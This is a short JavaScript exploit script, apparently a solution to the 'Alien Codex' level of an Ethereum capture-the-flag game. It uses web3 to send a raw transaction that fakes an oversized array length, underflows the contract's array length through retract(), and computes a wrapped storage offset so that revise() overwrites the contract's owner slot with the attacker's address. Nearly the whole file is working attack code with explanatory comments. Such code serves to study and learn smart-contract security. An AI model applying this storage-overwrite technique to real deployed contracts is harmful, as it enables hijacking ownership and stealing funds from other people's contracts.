const level20 = async (web3, AlienCodex) => {
    const targetAddress = '0xe5f9f939c282b1c032d3f4c05d3061cdcb0621cc';
    console.log(`Exploiting Level20 target ${targetAddress}...`);

    console.log('Retrieving target...');
    const target = await AlienCodex.at(targetAddress);

    console.log('Retrieving current address...');
    const player = (await web3.eth.getAccounts())[0];

    console.log('Making first contact...');
    // we want to invoke make_contact on the target contract with a parameter of simulated array length > 2*200
    const fnSignature = web3.utils.keccak256('make_contact(bytes32[])').slice(0, 10); // 0x + 4 bytes * 2 hex chars each
    const paramLocation = '0000000000000000000000000000000000000000000000000000000000000020'; // the dynamic array data starts 32 bytes after the argument encoding
    const length = '1000000000000000000000000000000000000000000000000000000000000000'; // the (simulated) size
    const content = ''; // we don't actually need any content for the array length to be checked
    const data = fnSignature + paramLocation + length + content;
    await web3.eth.sendTransaction({from: player, to: targetAddress, data: data});

    console.log('Underflowing the array size...');
    await target.retract();

    console.log('Overwriting owner...');
    const arrayLocation = web3.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001');
    const offset = web3.utils.toTwosComplement('-' + arrayLocation);
    const newOwner = `0x000000000000000000000000${player.slice(2)}`;
    await target.revise(offset, newOwner);
};

module.exports = level20;